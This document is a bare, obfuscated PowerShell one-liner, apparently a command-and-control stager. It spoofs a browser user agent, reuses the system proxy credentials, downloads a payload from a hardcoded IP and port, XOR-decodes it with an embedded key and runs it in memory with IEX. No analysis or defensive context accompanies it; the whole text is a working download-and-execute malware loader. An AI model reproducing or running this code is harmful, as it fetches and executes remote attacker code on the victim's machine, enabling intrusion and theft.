
$Wc=NEW-ObJEct SysTEm.NET.WEBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADeRs.AdD('User-Agent',$u);$wC.PrOxy = [SYSTeM.NeT.WeBREQuEst]::DEfaUltWeBProXY;$WC.PRoxy.CRedEnTialS = [SYsTEm.NET.CReDeNTIALCAcHE]::DEFAULtNETWOrKCREdEntIALs;$K='e8f9578e2966fb2fa1ed5a0b15a4531c';$i=0;[cHar[]]$b=([chaR[]]($wc.DOWnlOaDStRINg("http://10.89.208.189:4465/index.asp")))|%{$_-BXoR$K[$i++%$k.LENGTH]};IEX ($B-JOIN'')

